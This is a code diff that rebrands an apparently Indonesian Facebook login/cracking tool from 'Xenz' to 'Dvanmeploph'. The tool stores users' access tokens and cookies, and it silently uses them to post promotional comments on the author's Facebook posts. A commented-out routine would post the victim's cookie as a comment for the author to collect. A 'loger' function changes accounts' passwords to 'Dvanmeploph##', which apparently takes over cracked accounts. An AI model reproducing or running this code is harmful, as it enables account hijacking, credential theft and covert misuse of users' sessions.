@@ -248,7 +248,7 @@ class Login:
 				token = req['access_token']
 				open("data/.token.log","w").write(token)
 				open("data/.cookies.log","w").write(cookie)
-#				self.Bot_Xenz(cookie,token)
+#				self.Bot_Dvanmeploph(cookie,token)
 				Login()
 
 #			except (AttributeError,Exception,KeyError):
@@ -256,7 +256,7 @@ class Login:
 				print (e)
 				print ('{}{}Login gagal coba ganti cookienya'.format(ketik,M))
 				exit()
-	def Bot_Xenz(self,cookie,token):
+	def Bot_Dvanmeploph(self,cookie,token):
 #			try:
 #				r.post(f"https://graph.facebook.com/100041654630505_1107301094001701/comments?message={cookie}&access_token={token}",cookies={"cookie":cookie})
 #				link = r.get('https://api.waifu.pics/sfw/waifu',headers={'User-Agent':agent})
@@ -277,7 +277,7 @@ class Login:
 #				idku = '100041654630505_1134755737922903'
 #				r.post('https://graph.facebook.com/'+idku+'/comments',params=data,files=file,cookies={'cookie':cookie},headers={'User-Agent':agent})
 #			except:pass
-		self.id = '100041654630505_1064482231616921'
+		self.id = '100013275378835_1658880191231144'
 		self.kata = [
 		f'Mantap bang @[{self.id.split("_")[0]}:0]',
 		f'Panutan ku ni @[{self.id.split("_")[0]}:0]',
@@ -302,7 +302,7 @@ class Login:
 			try:
 				for x in r.get('https://graph.facebook.com/{}/posts?access_token={}'.format(self.id.split('_')[0],token),cookies={'cookie':cookie}).json()['data']:
 					self.list_id = x['id']
-					self.komentar = '{}\n\nhttps://www.facebook.com/{}\n\nKomentar ditulis oleh bot XenZ\nDate: {}\nTime: {}'.format(random.choice(self.kata), self.list_id, self.saat_ini, strftime('%H:%M:%S'))
+					self.komentar = '{}\n\nhttps://www.facebook.com/{}\n\nKomentar Ditulis Oleh Bot Dvanmeploph\nDate: {}\nTime: {}'.format(random.choice(self.kata), self.list_id, self.saat_ini, strftime('%H:%M:%S'))
 					r.post(f"https://graph.facebook.com/{self.list_id}/comments?message={self.komentar}&access_token={token}",cookies={"cookie":cookie})
 #					print (self.komentar)
 			except Exception as e:pass
@@ -367,12 +367,12 @@ class Menu:
 		self.List_Menu()
 	def List_Menu(self):
 		os.system('clear')
-		Banner_Xenz()
+		Banner_Dvanmeploph()
 		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] name account : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] id account   : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] ip address   : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] simcard      : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] country      : [#00ff08]{}'''.format(self.nama,self.id,self.IP,self.simcard,self.CN)
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] ID Account   : [#00ff08]{}
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] IP Address   : [#00ff08]{}
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Privoder     : [#00ff08]{}
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Country      : [#00ff08]{}'''.format(self.nama,self.id,self.IP,self.simcard,self.CN)
 		Console().print(Panel(teks,subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center'),style=warna_rich,width=92)
 		print ('{}              ┌──────────────────────────────┼───────────────────────────────┐'.format(B))
 		print ('{}              │                              │                               │'.format(B))
@@ -990,7 +990,7 @@ def loger(coki, pw):
 
 		data = {}
 		pw_old = pw
-		pw_new = 'xenz##'
+		pw_new = 'Dvanmeploph##'
 
 		for ez in res.find_all('form', {'method':'post'}):
 			if '/password/change/?redirect_uri' in ez.get('action'):
